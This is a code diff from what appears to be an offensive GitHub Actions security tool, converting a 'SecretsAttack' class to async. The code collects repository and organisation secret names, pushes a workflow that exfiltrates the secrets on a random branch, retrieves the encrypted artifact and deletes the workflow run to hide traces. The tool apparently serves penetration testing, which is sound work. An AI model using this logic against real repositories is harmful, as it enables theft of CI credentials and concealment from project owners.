@@ -37,7 +37,7 @@ class SecretsAttack(Attacker):
     exfiltrating GitHub Actions secrets files.
     """
 
-    def __collect_secret_names(self, target_repo):
+    async def __collect_secret_names(self, target_repo):
         """Method to collect list of secrets prior to exfil.
 
         Args:
@@ -49,8 +49,8 @@ class SecretsAttack(Attacker):
 
         secrets = []
         secret_names = []
-        repo_secret_list = self.api.get_secrets(target_repo)
-        org_secret_list = self.api.get_repo_org_secrets(target_repo)
+        repo_secret_list = await self.api.get_secrets(target_repo)
+        org_secret_list = await self.api.get_repo_org_secrets(target_repo)
 
         if repo_secret_list:
             secrets.extend(repo_secret_list)
@@ -159,7 +159,7 @@ EOF
 
         return cleartext
 
-    def secrets_dump(
+    async def secrets_dump(
         self,
         target_repo: str,
         target_branch: str,
@@ -179,7 +179,7 @@ EOF
             yaml_name (str): Name of yaml to use for exfil workflow.
 
         """
-        self.setup_user_info()
+        await self.setup_user_info()
 
         if not self.user_perms:
             return False
@@ -189,7 +189,7 @@ EOF
             and "workflow" in self.user_perms["scopes"]
         ):
 
-            secret_names = self.__collect_secret_names(target_repo)
+            secret_names = await self.__collect_secret_names(target_repo)
 
             if not secret_names:
                 return False
@@ -200,7 +200,7 @@ EOF
             else:
                 branch = "".join(random.choices(string.ascii_lowercase, k=10))
 
-            res = self.api.get_repo_branch(target_repo, branch)
+            res = await self.api.get_repo_branch(target_repo, branch)
             if res == -1:
                 Output.error("Failed to check for remote branch!")
                 return
@@ -209,12 +209,12 @@ EOF
                 return
             priv_key, pubkey_pem = self.__create_private_key()
             yaml_contents = self.create_exfil_yaml(pubkey_pem, branch)
-            workflow_id = self.execute_and_wait_workflow(
+            workflow_id = await self.execute_and_wait_workflow(
                 target_repo, branch, yaml_contents, commit_message, yaml_name
             )
             if not workflow_id:
                 return
-            res = self.api.retrieve_workflow_artifact(target_repo, workflow_id)
+            res = await self.api.retrieve_workflow_artifact(target_repo, workflow_id)
 
             if not res:
                 Output.error("Failed to Retrieve workflow artifact!")
@@ -237,7 +237,7 @@ EOF
                 else:
                     Output.error("Unexpected run artifact structure!")
             if delete_action:
-                res = self.api.delete_workflow_run(target_repo, workflow_id)
+                res = await self.api.delete_workflow_run(target_repo, workflow_id)
                 if not res:
                     Output.error("Failed to delete workflow!")
                 else:
